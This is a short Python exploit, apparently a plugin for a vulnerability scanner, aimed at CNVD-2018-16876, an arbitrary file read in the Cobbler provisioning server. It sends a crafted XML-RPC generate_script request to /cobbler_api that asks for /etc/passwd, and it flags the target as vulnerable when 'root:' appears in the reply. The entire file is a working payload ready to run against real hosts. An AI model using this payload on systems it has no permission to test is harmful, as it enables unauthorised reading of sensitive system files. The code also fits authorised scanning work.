#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Cobbler任意文件读取 CNVD-2018-16876',

      'level'     :   'high',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/cobbler_api'
  data = "<?xml version='1.0'?><methodCall><methodName>generate_script</methodName><params><param><value><string>windows10</string></value></param><param><value><string></string></value></param><param><value><string>/etc/passwd</string></value></param></params></methodCall>"
  url1 = url + target
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:',res.text,re.S):
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret